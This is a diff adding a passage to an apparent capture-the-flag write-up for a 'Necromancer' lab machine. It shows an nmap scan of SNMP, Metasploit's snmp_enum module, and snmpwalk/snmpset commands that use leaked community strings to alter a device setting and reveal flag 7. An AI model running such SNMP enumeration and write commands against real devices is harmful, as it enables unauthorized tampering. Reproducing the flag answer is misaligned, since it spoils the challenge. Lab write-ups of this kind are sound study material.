@@ -828,3 +828,107 @@ Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
 </pre>
 
 o_O ok....
+<pre>
+  <code class="bash">
+  nmap -sS 192.168.99.100 -p 161
+
+  Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-31 20:39 CET
+  Nmap scan report for 192.168.99.100
+  Host is up (0.00029s latency).
+
+  PORT    STATE    SERVICE
+  161/tcp filtered snmp
+  MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)
+
+  Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
+
+  </code>
+</pre>
+
+OK, it is open. It's msf time.
+
+<pre>
+  <code class="bash">
+  msfconsole
+
+
+                        .....
+                   .d$$$$*$$$$$$bc
+                .d$P"    d$$    "*$$.
+               d$"      4$"$$      "$$.
+             4$P        $F ^$F       "$c
+            z$%        d$   3$        ^$L
+           4$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F
+           $$$F"""""""$F""""""$F"""""C$$*$
+          .$%"$$e    d$       3$   z$$"  $F
+          4$    *$$.4$"        $$d$P"    $$
+          4$      ^*$$.       .d$F       $$
+          4$       d$"$$c   z$$"3$       $F
+           $L     4$"  ^*$$$P"   $$     4$"
+           3$     $F   .d$P$$e   ^$F    $P
+            $$   d$  .$$"    "$$c 3$   d$
+             *$.4$"z$$"        ^*$$$$ $$
+              "$$$$P"             "$$$P
+                *$b.             .d$P"
+                  "$$$ec.....ze$$$"
+                      "**$$$**""
+
+
+
+       =[ metasploit v4.16.13-dev                         ]
++ -- --=[ 1697 exploits - 969 auxiliary - 299 post        ]
++ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > use auxiliary/scanner/snmp/snmp_enum
+msf auxiliary(snmp_enum) > set RHOSTS 192.168.99.100
+RHOST => 192.168.99.100
+msf auxiliary(snmp_enum) > set COMMUNITY death2all
+COMMUNITY => death2all
+msf auxiliary(snmp_enum) > run
+
+[+] 192.168.99.100, Connected.
+
+[*] System information:
+
+Host IP                       : 192.168.99.100
+Hostname                      : Fear the Necromancer!
+Description                   : You stand in front of a door.
+Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
+Location                      : Locked - death2allrw!
+Uptime snmp                   : -
+Uptime system                 : -
+System date                   : -
+
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+  </code>
+</pre>
+
+<pre>
+  <code class="bash">
+  snmpwalk -c "death2allrw" -v 1 192.168.99.100 | grep Locked
+Created directory: /var/lib/snmp/mib_indexes
+iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
+iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
+
+
+  </code>
+</pre>
+
+Let's unlock the door.
+
+<pre>
+  <code class="bash">
+  snmpset -c "death2allrw" -v 1 192.168.99.100 iso.3.6.1.2.1.1.6.0 s  "Unlocked"
+iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
+  snmpwalk -c "death2allrw" -v 1 192.168.99.100 | grep flag
+iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
+
+  </code>
+</pre>
+
+Flag 7, Yeah...
